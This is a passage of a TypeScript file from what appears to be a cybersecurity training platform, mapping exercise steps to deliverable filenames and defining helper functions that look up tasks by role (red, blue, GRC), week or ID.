  'blue-w2-s4': 'Win_EventLog.txt',
  'blue-w2-s5': 'Attack_Traffic.pcap',
  'blue-w3-s1': 'Attack_Pcap.pcap',
  'blue-w3-s2': 'Attack_Logs.txt',
  'blue-w3-s4': 'Containment_Actions.txt',
  'blue-w3-s5': 'Win_Detection.txt',
  'grc-w3-s2': 'Evidence_Hashes.txt',
};

export function getStepDeliverable(stepId: string): string | undefined {
  return STEP_DELIVERABLES[stepId];
}

// All deliverable filenames expected from a role for a given week.
export function getDeliverablesForWeek(role: 'red' | 'blue' | 'grc', week: number): string[] {
  const tasks = getTasksByRole(role, week);
  const set = new Set<string>();
  tasks.forEach((t) => t.deliverables.forEach((d) => set.add(d)));
  return Array.from(set);
}

// Export all tasks
export const ALL_TASKS: Task[] = [...RED_TASKS, ...BLUE_TASKS, ...GRC_TASKS];

export function getTasksByRole(role: 'red' | 'blue' | 'grc', week?: number): Task[] {
  let tasks = ALL_TASKS.filter(t => t.role === role);
  if (week) {
    tasks = tasks.filter(t => t.week === week);
  }
  return tasks;
}

export function getTaskById(id: string): Task | undefined {
  return ALL_TASKS.find(t => t.id === id);
}

export function getWeekTasks(week: number): Task[] {
  return ALL_TASKS.filter(t => t.week === week);
}
